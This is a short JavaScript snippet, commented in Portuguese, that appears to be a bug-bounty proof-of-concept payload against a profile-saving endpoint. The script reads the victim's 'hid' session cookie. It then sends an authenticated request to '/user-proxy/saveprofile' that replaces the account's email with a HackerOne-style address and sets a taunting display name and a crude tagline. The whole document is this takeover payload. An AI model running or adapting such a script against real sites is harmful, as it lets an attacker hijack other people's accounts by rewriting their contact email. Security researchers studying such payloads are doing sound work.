(() => {
  // Lê o cookie "hid"
  function getCookie(name) {
    const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)'));
    return m ? decodeURIComponent(m[1]) : null;
  }

  const hid = getCookie('hid');
  if (!hid) {
    console.error('Cookie "hid" não encontrado.');
    return;
  }

  const payload = {
    "hashId": hid,
    "email": "foorw1nner+747@wearehackerone.com",
    "data": {
      "displayName": "userHacking",
      "tagLine": "putasecaaaaaa",
      "social": {
        "facebookUsername": null,
        "instagram": null,
        "pinterestUsername": null,
        "tumblr": null,
        "twitterHandle": null
      },
      "websiteUrl": "",
      "region": null,
      "city": null,
      "state": null,
      "profileImage": "https://cam-image-store.accountservices.meredithcorp.io/ddm_images/alrcom_00af0c48d02cf423599e41d69368373d746cf217ccc10bc5477dd3d7352bec99_1754077137598",
      "handle": "cab7e6ba3e0485da",
      "facebookUsername": "",
      "instagram": "",
      "pinterestUsername": "",
      "tumblr": "",
      "twitterHandle": ""
    }
  };

  fetch('/user-proxy/saveprofile', {
    method: 'POST',
    credentials: 'include', // envia com cookies/sessão
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/plain, */*'
    },
    body: JSON.stringify(payload)
  })
  .then(function (res) {
    if (res.ok) {
      return res.json();
    }
    return res.text().then(function (txt) {
      return Promise.reject({ status: res.status, body: txt });
    });
  })
  .then(function (json) {
    console.log('Perfil salvo com sucesso:', json);
  })
  .catch(function (err) {
    console.error('Falha ao salvar o perfil:', err);
  });
})();
